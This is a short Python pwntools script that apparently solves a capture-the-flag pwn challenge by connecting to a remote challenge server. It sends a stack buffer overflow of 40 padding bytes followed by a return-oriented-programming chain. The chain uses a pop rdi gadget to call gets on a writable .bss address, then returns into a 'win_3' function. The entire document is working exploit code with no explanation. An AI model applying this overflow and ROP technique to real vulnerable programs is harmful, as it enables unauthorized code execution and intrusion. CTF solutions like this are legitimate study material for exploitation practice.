from pwn import *

target = remote("pwn.katagaitai-ctf.com", 9012)

win_3 = 0x401531
pop_rdi = 0x401693
gets_plt = 0x401080
bss_writable = 0x404200

payload = b"A" * 40
payload += p64(pop_rdi)
payload += p64(bss_writable)
payload += p64(gets_plt)
payload += p64(win_3)

target.sendline(payload)
target.sendline(b"katagaitai")
print(target.recvall().decode())